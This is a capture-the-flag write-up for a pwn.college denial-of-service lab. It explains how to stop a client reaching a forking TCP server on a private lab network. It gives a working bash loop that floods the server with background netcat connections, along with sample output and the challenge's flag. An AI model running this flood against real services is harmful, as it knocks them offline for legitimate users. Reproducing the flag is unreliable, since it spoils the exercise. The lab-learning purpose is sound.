---
layout: page
title: "Denial-of-service-3 — Writeup"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


## 🧠 Challenge Overview

In this challenge, we are given a virtual network with three hosts:

- **User Host** (`10.0.0.1`): You
- **Server Host** (`10.0.0.2`): Listens on TCP port `31337`
- **Client Host** (`10.0.0.3`): Tries to connect to the server and send `"Hello, World!\n"` once every second

If the client **fails to send** the message (e.g., connection timeout), it **prints the flag**.

---

## 🎯 Goal

**Prevent the client from connecting** to the server on port `31337`.  
This is a classic **Denial-of-Service (DoS)** scenario. If the server is too busy (e.g., stuck handling our requests), it can't serve the client — and the flag is revealed.

---

## 🔍 Server Logic Summary (from `/challenge/run`)

- Server listens on `0.0.0.0:31337`.
- Each incoming connection is handled via `ForkingTCPServer`, which forks a new process.
- Each handler waits up to `1s` for a message, then closes.
- The client retries forever, but **if it hits a `TimeoutError` or `socket.timeout`**, it prints the flag.

---

## 💡 Exploit Strategy

We flood the server with **many rapid short-lived connections**, occupying its process slots, causing:

- **Fork overload**: server runs out of process slots
- **Connection backlog saturation**
- **Socket timeouts** due to load

We want to *flood the server* **without crashing our shell** by hitting the system fork limit.

---

## 💣 Final Exploit

```bash
while true; do
  nc -w 2 10.0.0.2 31337 &
  sleep 0.000000001
done
```

- nc -w 2: sets a 2s timeout per connection
- &: runs in background
- sleep 0.000000001: slight delay to avoid hitting:
```
-bash: fork: retry: Resource temporarily unavailable

```
This script spawns many connections to overwhelm the server, while staying under the fork limit.

### Sample Output

```
[12248] 50552
[11737]   Exit 1  nc -w 2 10.0.0.2 31337
...
[12318]   Done    nc -w 2 10.0.0.2 31337
root@ip-10-0-0-1:~#
```
Eventually, the client fails to connect, and we get:
```
pwn.college{U55-2EAaxUiI_mD6vLgJNCPKwUC.0VO1AjNxwSM0IzMyEzW}
```

---

## Final Flag
```
pwn.college{U55-2EAaxUiI_mD6vLgJNCPKwUC.0VO1AjNxwSM0IzMyEzW}
```
---
